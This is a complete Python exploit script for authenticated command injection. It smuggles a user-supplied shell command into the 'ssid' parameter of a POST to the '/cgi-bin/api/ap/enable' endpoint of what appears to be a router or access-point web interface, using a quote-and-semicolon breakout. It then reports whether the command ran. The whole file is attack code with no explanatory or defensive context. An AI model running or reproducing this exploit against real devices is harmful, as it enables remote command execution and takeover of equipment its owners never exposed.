import requests, sys
import urllib.parse
import warnings
warnings.filterwarnings("ignore")


## Get arguments
if (len(sys.argv) < 3):
    print("Usage: python3 exploit.py <domain/IP> <authtoken> \"<command>\"")
    sys.exit(1)

url = sys.argv[1]
token = sys.argv[2]
command = sys.argv[3]


## Check command length
if len(command) >= 46:
    print("Command too long")
    sys.exit(1)


## Send request
data = "id=37&enable=false&ssid=';"+urllib.parse.quote_plus(command)+";echo+'"
headers = {'Authorization': token, 'Content-Type': 'application/x-www-form-urlencoded'}
response = requests.request("POST", "http://"+url+"/cgi-bin/api/ap/enable", verify=False, timeout=4, data=data, headers=headers)


## Check response
try:
    code = response.json()['code']
    if code == -1:
        print("[-] Auth token invalid")
    elif code == 0:
        print("[+] Command executed")
    else:
        sys.exit(1)
except:
    print(response.text)
    print(response.status_code)
    print("[-] Machine not vulnerable, error was encountered")